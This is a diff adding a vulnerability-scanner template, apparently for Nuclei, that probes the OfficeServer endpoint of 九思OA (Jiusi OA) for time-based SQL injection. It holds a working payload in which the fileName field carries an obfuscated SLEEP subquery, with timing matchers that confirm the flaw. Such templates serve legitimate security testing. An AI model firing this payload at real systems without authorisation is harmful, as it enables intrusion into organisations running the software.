@@ -1,0 +1,35 @@
+id: jsoa-OfficeServer-sqli
+info:
+  name: 九思OA-officeserver接口sql注入漏洞
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/CRlife/Rscan/commit/7e6b361e2d328ea4623b0baa68767d5e696e8a70
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: sqli,time,jsoa
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        POST /jsoa/OfficeServer HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        isAjaxDownloadTemplate=true&fileName='/**/AND/**/(SELECT/**/1/**/FROM/**/(SELECT(SLEEP(5)))T)/**/AND/**/'1'='1
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body,'Untitled Document')
+          - duration >= 5 && duration < 9
+        condition: and
